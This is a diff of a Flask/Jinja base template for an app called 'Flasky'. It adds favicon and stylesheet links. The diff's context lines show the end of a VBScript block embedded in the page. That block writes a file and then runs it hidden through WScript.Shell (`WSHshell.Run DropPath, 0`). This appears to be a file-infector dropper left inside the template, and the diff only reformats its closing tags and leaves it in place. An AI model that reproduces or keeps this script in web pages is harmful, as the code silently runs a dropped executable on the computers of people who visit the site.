@@ -2,8 +2,9 @@
 
 {% block head %}
 {{ super() }}
+<link rel="icon" href="{{ url_for('static',filename='favicon.ico') }}" type="image/x-icon">
 <link rel="shortcut icon" href="{{ url_for('static',filename='favicon.ico') }}" type="image/x-icon">
-<link rel="shortcut icon" href="{{ url_for('static',filename='favicon.ico') }}" type="image/x-icon">
+<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='styles.css') }}">
 {% endblock%}
 {% block title %}Flasky{% endblock %}
 
@@ -75,7 +76,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//-->
-
-
-</SCRIPT>
+//--></SCRIPT>
